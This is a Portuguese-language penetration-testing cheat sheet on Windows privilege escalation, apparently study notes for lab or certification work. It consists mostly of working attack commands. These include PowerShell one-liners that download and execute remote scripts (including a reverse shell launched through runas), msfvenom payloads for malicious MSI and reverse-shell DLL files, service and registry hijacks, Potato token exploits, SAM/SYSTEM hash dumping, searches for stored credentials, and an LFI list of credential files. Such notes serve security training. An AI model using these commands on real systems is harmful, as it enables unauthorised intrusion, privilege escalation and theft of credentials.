# 6. Escalação de Privilégios — Windows

> [!tip] Ver arquivos ocultos: `dir /r`, `dir /A`, `Get-ChildItem . -Force`

### 6.1 Ferramentas automáticas
```powershell
# PowerUp:
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/PowerUp.ps1')"; Invoke-AllChecks
# winPEAS:
powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.6/winPEAS64.exe','C:\Users\Public\wp.exe')"; .\wp.exe
# Watson (kernel exploits), Seatbelt
```

### 6.2 Enum manual
```cmd
:: OS / arquitetura / patches
systeminfo & wmic qfe get Caption,HotFixID,InstalledOn
:: Usuários / grupos / privilégios
whoami /priv & net users & net localgroup Administrators
:: Autologon / credenciais no registro
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"
reg query HKLM /f password /t REG_SZ /s
cmdkey /list
:: Serviços / processos / portas
tasklist /svc & sc query & netstat -ano
:: Startup / tarefas agendadas
schtasks /query /fo LIST /v & wmic startup get caption,command
```
```powershell
Get-LocalUser | ft Name,Enabled
Get-LocalGroupMember Administrators
Get-Process | where {$_.ProcessName -notlike "svchost*"}
```

### 6.3 Vetores clássicos

**AlwaysInstallElevated** (WPE-09)
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: se ambos = 1:
msfvenom -p windows/exec CMD='net localgroup administrators pwn /add' -f msi-nouac -o setup.msi
msiexec /quiet /qn /i C:\Temp\setup.msi
```

**Unquoted Service Path** (WPE-08)
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
:: ex: C:\Program Files (x86)\Sync Breeze\bin\syncbrs.exe  → dropar C:\Program Files (x86)\Sync.exe
net stop "Sync Breeze Enterprise" & net start "Sync Breeze Enterprise"
```

**Weak Service Permissions** (WPE-04)
```cmd
accesschk.exe -uwcqv "Users" *
sc config <svc> binpath= "C:\Users\user\Desktop\shell.exe"
:: ou substituir o binário se tiver write (BUILTIN\Users:(F)), depois reiniciar/reboot
shutdown /r /t 0
```

**Insecure Registry Permissions** (WPE-12)
```cmd
:: se pode modificar o ImagePath do serviço:
reg add "HKLM\SYSTEM\ControlSet001\Services\Apache" /t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\shell2.exe" /f
```

**DLL Hijacking** (WPE-05): procmon → "NAME NOT FOUND" em `.dll` + write na pasta. Ordem de busca: dir da app → System32 → System → Windows → CWD → PATH.
```cmd
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f dll -o evil.dll
```

**DLL Injection** (WPE-03): injetar DLL num processo privileged via CreateRemoteThread/LoadLibrary.

**Potatoes** (SeImpersonatePrivilege / SeAssignPrimaryToken) → SYSTEM
```cmd
whoami /priv    :: procurar SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
:: PrintSpoofer (mais confiável em Win10/2016+):
PrintSpoofer64.exe -i -c powershell
PrintSpoofer64.exe -c "C:\Users\Public\shell.exe"
:: GodPotato (moderno) / JuicyPotato (≤2016) / RoguePotato:
GodPotato-NET4.exe -cmd "cmd /c whoami"
JuicyPotato.exe -l 1337 -p c:\shell.exe -t * -c {CLSID}
```

**SeBackupPrivilege / SeRestorePrivilege** → dump SAM+SYSTEM (ou NTDS num DC)
```cmd
reg save HKLM\SAM   C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
:: transferir p/ kali e extrair:
:: impacket-secretsdump -sam sam.save -system system.save LOCAL
:: Num DC (com o volume shadow): usar diskshadow + robocopy p/ NTDS.dit, depois secretsdump.
```

**GPP passwords** (WPE-07) — MS14-025
```bash
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
# ou Groups.xml em C:\ProgramData\Microsoft\Group Policy\History\...\Groups.xml
gpp-decrypt <cpassword>
# PowerUp: Get-GPPPassword / Get-CachedGPPPassword
```

**Kernel exploits** (WPE-02)
```cmd
wmic qfe get Caption,HotFixID,InstalledOn
```
```bash
# wesng:
wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege"
# windows-exploit-suggester:
python windows-exploit-suggester.py -d mssb.xls -i systeminfo.txt -l
```
Comuns: MS16-135, MS16-032, MS15-051, MS14-058, MS16-016, MS10-092, MS15-061.

**Secondary Logon Handle** (WPE-11) — MS16-032 (Invoke-MS16032.ps1).
**Intel SYSRET** (WPE-13) — MS12-042: `sysret.exe -pid <pid>`.

### 6.4 RunAs (credenciais conhecidas)
```powershell
# credenciais salvas (cmdkey /list):
runas /user:DOMAIN\Administrator /savecred "powershell -c IEX(New-Object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')"
# runme.ps1 com credenciais:
$secpw = ConvertTo-SecureString "Welcome1!" -AsPlainText -Force
$cred  = New-Object System.Management.Automation.PSCredential("Administrator",$secpw)
[System.Diagnostics.Process]::Start("C:\rev.exe","",$cred.Username,$cred.Password,"workstation7")
```

### 6.5 Admin → SYSTEM / bypass de UAC
```cmd
PsExec.exe -i -s -d CMD
psexec.py Administrator:'SENHA'@$IP
:: UAC: se admin, subir o integrity level
powershell Start-Process cmd.exe -Verb runAs
:: bypass com fodhelper.exe (procmon → registro ausente em HKCU)
```

### 6.6 LLMNR / NBT-NS poisoning
Máquina falha no DNS → pergunta na rede local → atacante responde e captura o hash NTLMv2.
```bash
responder -I tun0 -rv
# depois crackear o hash NTLMv2
```

### 6.7 Credenciais armazenadas (WPE-01)
```cmd
cmdkey /list
:: arquivos unattended:
C:\unattend.xml  C:\Windows\Panther\Unattend.xml  C:\Windows\system32\sysprep\sysprep.xml
:: buscar credenciais:
findstr /si password *.txt *.xml *.ini *.config 2>nul
:: registro: sessões PuTTY, VNC, McAfee SiteList.xml
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```
PowerSploit: `Get-UnattendedInstallFile`, `Get-Webconfig`, `Get-SiteListPassword`, `Get-CachedGPPPassword`, `Get-RegistryAutoLogon`.

### 6.8 LFI files (Windows)
```text
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\Panther\Unattend.xml
C:\Windows\System32\drivers\etc\hosts
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\{access,error}.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\mysql\bin\my.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\MySQL Server 5.x\my.ini
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\php\php.ini
```